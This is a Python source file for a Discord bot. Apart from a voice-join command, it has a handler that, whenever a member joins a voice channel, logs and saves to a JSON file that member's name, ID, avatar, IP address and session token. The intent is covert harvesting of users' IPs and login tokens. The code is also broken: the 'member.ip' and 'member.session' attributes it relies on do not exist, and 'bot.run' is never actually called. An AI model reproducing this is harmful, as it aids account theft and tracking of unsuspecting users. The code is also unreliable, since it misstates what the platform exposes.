import discord
from discord.ext import commands
import json

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')

@bot.command(name='join', help='Tells the bot to join the voice channel')
async def join(ctx):
    if not ctx.message.author.voice:
        await ctx.send("You are not connected to a voice channel.")
        return
    else:
        channel = ctx.message.author.voice.channel
    await channel.connect()

@bot.event
async def on_voice_state_update(member, before, after):
    if member.id == bot.user.id:
        return

    if before.channel is None and after.channel is not None:
        print(f"{member.name} joined the voice channel.")
        print(f"IP Address: {member.ip}")
        print(f"Session Token: {member.session}")

        # Write information to JSON file
        data = {
            "username": member.name,
            "id": member.id,
            "avatar_url": str(member.avatar.url),
            "ip_address": member.ip,
            "session_token": member.session
        }
        with open('/src/data/data/data.json', 'w') as outfile:
            json.dump(data, outfile)

bot.run